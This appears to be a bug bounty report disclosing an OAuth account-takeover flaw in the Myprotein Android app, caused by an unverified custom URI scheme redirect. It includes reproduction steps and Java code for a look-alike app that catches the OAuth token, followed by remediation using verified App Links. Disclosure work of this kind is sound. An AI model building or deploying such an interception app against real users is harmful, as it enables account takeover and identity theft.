# Title: OAuth Account Takeover Due to Improper Intent Handling in Myprotein APK

---

# What i was able to do:
I was able to steal to the OAuth token of a user (myself), With this token, I gained full access to the user’s account,  performing a complete OAuth Account Takeover.  

## POC:

[myproteinAndroid_oauth_poc.mp4](https://bugcrowd.com/engagements/hutgroup-og/submissions/9e1e74be-092e-4a68-b753-5b9e13bcc5d6/attachments/dd80932c-586d-4b3e-b74a-916096349250 "myproteinAndroid_oauth_poc.mp4")

---

# Description:
The core issue lies in the assumption made during the OAuth authentication flow, where ownership of the custom scheme specified in the redirect_uri is presumed to be exclusively tied to the legitimate client application. 

For example, when `redirect_uri=examplehost://authorize/#oauth_token` is used, it is assumed that `examplehost://authorize` only belongs to the client app, since the app configured this to this custom scheme as part of the OAuth process.

However, The problem with this approach is that any application on the user's device can potentially register this custom scheme, thereby receiving the OAuth grant that was intended for the legitimate app.

This allows two applications to potentially register the same custom URI scheme. If both apps use identical attributes (e.g., scheme, host, port, or path), the system will prompt the user to choose which app should handle the OAuth response. This opens the door for attackers to craft a malicious APK that masquerades as the legitimate app, intercepting the OAuth token and redirecting it to their exploitative app instead.

---


# Steps to reproduce:

So to exploit this in Myprotein app you need to follow the below steps:

### Finding vulnerable custom URI:-
1. Decompile Myprotein APK
1. Go to *AndroidManifest.xml* 
1. Search for the intent filters that receive those URI's that contain sensitive data, such as token or code.

### Making Exploit APK:-
1. Create  an Android Studio Project
1. Create an empty Activity
1. Go to *AndroidManifest.xml* file and add the same intent filter found in Myprotein APK, into exploit APK's main activity.
1. Add the following code to MainActivity.java to intercept the OAuth token and Build the APK.


```
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

/* loaded from: classes.dex */
public class MainActivity extends AppCompatActivity {
    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle bundle) {
        Uri data;
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
        TextView textView = (TextView) findViewById(R.id.titleTextView);
        TextView textView2 = (TextView) findViewById(R.id.textView);
        Button button = (Button) findViewById(R.id.copyButton);
        button.setVisibility(8);
        Intent intent = getIntent();
        if (!"android.intent.action.VIEW".equals(intent.getAction()) || (data = intent.getData()) == null) {
            return;
        }
        final String uri = data.toString();
        textView.setText("OAuth Code Leaked Successfully");
        textView2.setText(uri);
        button.setVisibility(0);
        button.setOnClickListener(new View.OnClickListener() { // from class: com.oauth.exploitfb1.MainActivity.1
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                ((ClipboardManager) MainActivity.this.getSystemService("clipboard")).setPrimaryClip(ClipData.newPlainText("URL", uri));
                Toast.makeText(MainActivity.this, "Data copied to clipboard", 0).show();
            }
        });
        Toast.makeText(this, "Data received", 0).show();
    }
}
```

---

# What victim must do:

## Flow:
1. Victim unintentionally downloads and installs the exploit APK sometime.
1. He installs Myprotein APK and signs up. 
1. When signing up is completed, He will be prompted with 2 exactly same icons to click on. 
1. He clicks on malicious apk. (as he is confuse which one is legitimate) 
1. OAuth tokens get passed to malicious apk. 

---

# Impact:
The impact of OAuth account takeover through mobile app impersonation can be severe and wide-ranging:

* Unauthorized Access.
* Identity Theft.
* Financial Loss.
* Reputation Damage.

---

# Recommendation:
In the context of OAuth, Custom schemes have been used traditionally, but there are more secure and reliable options available, notably:

App to app integration like Google Identity Services and Facebook Express Login for Android
[Android's verifiable AppLinks](https://developer.android.com/training/app-links/verify-android-applinks)

### You need to have /.well-known/assetlinks.json hosted on your backend with a format like this:

```
[
  {
    "relation": [
      "delegate_permission/common.handle_all_urls",
      "delegate_permission/common.get_login_creds"
    ],
    "target": {
      "namespace": "android_app",
      "package_name": "com.myapplication.android",
      "sha256_cert_fingerprints": [
        "APPLICATION_CERT_FINGERPRINT"
      ]
    }
  }
]
```

### AndroidManifest.xml
```
    <intent-filter android:autoVerify="true">
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />

    <!-- If a user clicks on a shared link that uses the "http" scheme, your
         app should be able to delegate that traffic to "https". -->
    <data android:scheme="http" />
    <data android:scheme="https" />

    <!-- Include one or more domains that should be verified. -->
    <data android:host="auth.myapp.com" />
</intent-filter>
```

### Kotlin
```
Log.i(TAG, "Creating auth request for login hint: $loginHint")
val authRequestBuilder: AuthorizationRequest.Builder = Builder(
    mAuthStateManager.getCurrent().getAuthorizationServiceConfiguration(),
    mClientId.get(),
    ResponseTypeValues.CODE,
    "https://auth.myapp.com/oauth/handler" // The redirect URI with an https scheme
)
    .setScope(mConfiguration.getScope())
if (!TextUtils.isEmpty(loginHint)) {
    authRequestBuilder.setLoginHint(loginHint)
}
mAuthRequest.set(authRequestBuilder.build())
```

---

# Reference:
[https://developers.googleblog.com/2023/10/enhancing-oauth-app-impersonation-protections.html](https://developers.googleblog.com/2023/10/enhancing-oauth-app-impersonation-protections.html)
[https://developer.android.com/training/app-links/verify-android-applinks](https://developer.android.com/training/app-links/verify-android-applinks)
[https://blog.ostorlab.co/one-scheme-to-rule-them-all.html](https://blog.ostorlab.co/one-scheme-to-rule-them-all.html)  
